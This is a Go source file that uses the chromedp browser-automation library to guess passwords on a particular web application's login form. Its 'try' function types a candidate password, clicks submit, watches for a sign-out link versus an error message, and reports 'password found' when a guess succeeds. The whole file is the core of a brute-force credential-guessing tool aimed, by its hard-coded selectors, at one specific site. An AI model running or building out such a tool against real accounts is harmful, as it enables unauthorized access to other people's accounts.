package main

import (
	"context"
	"errors"

	"github.com/chromedp/cdproto/cdp"
	"github.com/chromedp/chromedp"
)

const (
	LoginSelector    = "#app > div > div.Public__ContentContainer-ejuVqQ.hqHAQl > div > form > div:nth-child(1) > div.FormItem__Wrapper-hgTVpY.fgtRFA > div > input"
	PasswordSelector = "#app > div > div.Public__ContentContainer-ejuVqQ.hqHAQl > div > form > div:nth-child(2) > div > div > input"
	NoteSelector     = "#app > div > div.Public__ContentContainer-ejuVqQ.hqHAQl > div > form > div:nth-child(2) > div > div.FormError__Error-cnoJyA.dDlHQD.Text__BaseText-cyIABw.fmVBdx > span"
	SubmitSelector   = "#app > div > div.Public__ContentContainer-ejuVqQ.hqHAQl > div > form > div:nth-child(3) > button"
	SignoutSelector  = "#app > div > div.template__Nav-dNuRir.bVRcIk > div > div > div.NavbarMenu__BaseMenu-gSUDcE.eBAlO > ul > li:nth-child(4) > a > span:nth-child(1)"
)

func try(password string, resCh chan<- string) chromedp.Tasks {
	return chromedp.Tasks{
		chromedp.SendKeys(PasswordSelector, password, chromedp.ByQuery),
		chromedp.WaitEnabled(SubmitSelector, chromedp.ByQuery),
		chromedp.Click(SubmitSelector, chromedp.ByQuery),
		chromedp.ActionFunc(func(ctx context.Context, executor cdp.Executor) error {
			okCh, failCh, errCh := make(chan struct{}), make(chan struct{}), make(chan error)
			go func() {
				var str string
				err := chromedp.Text(SignoutSelector, &str, chromedp.ByQuery).Do(ctx, executor)
				if err != nil {
					errCh <- err
				}
				okCh <- struct{}{}
			}()
			go func() {
				var str string
				err := chromedp.Text(NoteSelector, &str, chromedp.ByQuery).Do(ctx, executor)
				if err != nil {
					errCh <- err
				}
				failCh <- struct{}{}
			}()
			select {
			case err := <-errCh:
				return err
			case <-okCh:
				resCh <- password
				return errors.New("password found")
			case <-failCh:
				return nil
			}
		}),
	}
}
